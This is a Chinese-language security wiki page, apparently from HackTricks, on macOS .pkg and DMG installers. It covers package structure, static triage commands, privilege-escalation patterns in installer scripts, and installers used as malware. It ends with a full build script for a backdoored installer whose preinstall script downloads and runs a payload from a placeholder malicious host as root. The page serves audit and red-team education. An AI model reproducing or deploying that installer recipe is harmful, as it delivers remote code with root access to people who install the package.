# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本信息

macOS **installer package**（也称为 `.pkg` 文件）是一种用于 macOS **分发软件**的文件格式。这些文件类似于一个**包含软件正确安装和运行所需全部内容的盒子**。

该 package 文件本身是一个归档文件，其中包含一套**将在目标**计算机上安装的文件和目录层级。它还可以包含用于在安装前后执行任务的 **scripts**，例如设置配置文件或清理软件的旧版本。

### Package 结构

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**：自定义内容（标题、欢迎文本等）以及 script/installation 检查
- **PackageInfo (xml)**：信息、安装要求、安装位置以及要运行的 scripts 路径
- **Bill of materials (bom)**：要安装、更新或删除的文件列表及其文件权限
- **Payload (CPIO archive gzip compressed)**：从 PackageInfo 中的 `install-location` 安装的文件
- **Scripts (CPIO archive gzip compressed)**：提取到临时目录中执行的安装前、安装后 scripts 及其他资源

### 解压
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
为了在不手动解压的情况下查看 installer 的内容，你也可以使用免费工具 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)。

### 静态 triage 快捷方法

如果目标是进行分析，请尽量**避免先使用 `Installer.app` 打开 package**。某些 package 会在 Installer 打开它们后立即执行 code（例如通过 `system.run()` 或 installer plug-ins），因此，离线提取通常是更安全的起点。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本信息

DMG 文件，即 Apple Disk Images，是 Apple macOS 用于磁盘映像的文件格式。DMG 文件本质上是一个**可挂载的磁盘映像**（包含自己的文件系统），其中包含通常经过压缩、有时经过加密的原始块数据。当你打开 DMG 文件时，macOS 会将其**挂载为物理磁盘**，从而允许你访问其中的内容。

> [!CAUTION]
> 请注意，**`.dmg`** installers **支持非常多种格式**，过去其中一些包含漏洞的格式曾被滥用来获取**内核代码执行**权限。

### 磁盘映像结构

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 文件的层级结构可能因内容而异。不过，对于应用程序 DMG，通常遵循以下结构：

- 顶层：这是磁盘映像的根目录，通常包含应用程序，以及可能指向 Applications 文件夹的链接。
- 应用程序（.app）：这是实际的应用程序。在 macOS 中，应用程序通常是一个包含组成该应用程序的许多独立文件和文件夹的 package。
- Applications 链接：这是 macOS 中 Applications 文件夹的快捷方式。这样设计是为了方便安装应用程序。你可以将 .app 文件拖到此快捷方式上来安装应用程序。

## 通过 pkg abuse 进行 Privesc

### 从公共目录执行

如果 pre- 或 post-installation script 执行类似 **`/var/tmp/Installerutil`** 的文件，而 attacker 能够替换该文件，那么当 installer 调用它时，attacker 就可以 escalate privileges。引用的演讲和 walkthrough 展示了这种不安全 external-script 模式的变体。<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

这是一个[公共函数](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)，多个 installers 和 updaters 会调用它来**以 root 身份执行某些内容**。此函数接受要**执行的文件**的**路径**作为参数；但是，如果 attacker 能够**修改**该文件，就可以**滥用**其 root 执行权限来**提升权限**。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
更多信息请查看此演讲：[https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### 环境与 shebang 滥用

现代 PackageKit 漏洞表明，installer scripts 通常会作为**受信任的 root code**执行，同时附近仍保留攻击者可控的上下文。在审计 vendor packages 时，应特别注意：

- Shell interpreters，例如 `#!/bin/zsh` / `#!/bin/bash`
- 类似 `sudo -u $USER`、`launchctl asuser` 的调用，或任何信任 `$USER`、`$HOME`、`PATH`、`TMPDIR` 或相对路径的逻辑
- 可能加载用户可控 init files 或 libraries 的非 Shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
对于 2024 年 PackageKit root-environment bug（用户发起安装期间继承 `~/.zshenv` / `~/.bash*`），请查看[通用 macOS privesc 页面](../macos-privilege-escalation.md)。如果 package 是 **Apple-signed**，同一个 script bug 可能变得与 **SIP/TCC** 相关，因为 `system_installd` 可能携带 `com.apple.rootless.install.heritable`；请参阅 [SIP 页面](../macos-security-protections/macos-sip.md)。<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### 通过挂载执行

如果 installer 写入 `/tmp/fixedname/bla/bla`，就可以使用 noowners 在 `/tmp/fixedname` 上方**创建一个 mount**，从而能够在安装期间**修改任意文件**，以滥用安装过程。

这方面的一个例子是 **CVE-2021-26089**，它成功**覆盖了一个 periodic script**，从而以 root 身份获得执行。更多信息请参阅演讲：[**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg 作为 malware

### 空 Payload

可以只生成一个包含 **pre 和 post-install scripts** 的 **`.pkg`** 文件，而不包含任何真实 payload；malware 全部位于这些 scripts 中。<sup>[[2]](#references)</sup>

### Distribution xml 中的 JS

可以在 package 的 **distribution xml** 文件中添加 **`<script>`** 标签，其中的代码将被执行，并且可以使用 **`system.run`** **执行命令**：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

对于 distribution packages，这通常取决于顶层的 `Distribution` 文件是否启用了 external scripts，例如设置 `allow-external-scripts="true"`。因此，仅检查 `preinstall` / `postinstall` 是不够的：**Distribution XML 本身**可能包含 `installation-check` / `volume-check` hooks，以及直接调用 `system.run()` / `system.runOnce()` 的执行路径。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 后门安装程序

使用 `dist.xml` 内部的 script 和 JS code 的恶意安装程序
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - 解包 Pkgs：深入了解 Macos Installer Packages 及常见安全缺陷](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0：“macOS Installers 的奇妙世界” - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - 解包 Pkgs：深入了解 MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming：利用 Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822：macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [使用 Apple-signed Packages 突破 SIP](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0：“Mount(ain) of Bugs” - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS 上的 1000 个 Installers 致命打击，一切都已损坏！](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
